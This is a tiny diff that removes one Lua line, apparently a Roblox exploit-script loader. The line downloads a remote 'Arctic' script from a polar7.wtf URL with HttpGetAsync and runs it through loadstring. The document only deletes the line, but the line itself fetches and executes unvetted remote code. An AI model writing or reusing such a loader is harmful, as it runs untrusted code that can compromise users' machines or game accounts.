@@ -1,1 +1,0 @@
-loadstring(game:HttpGetAsync("https://polar7.wtf/Arctic/Arctic.txt"))()
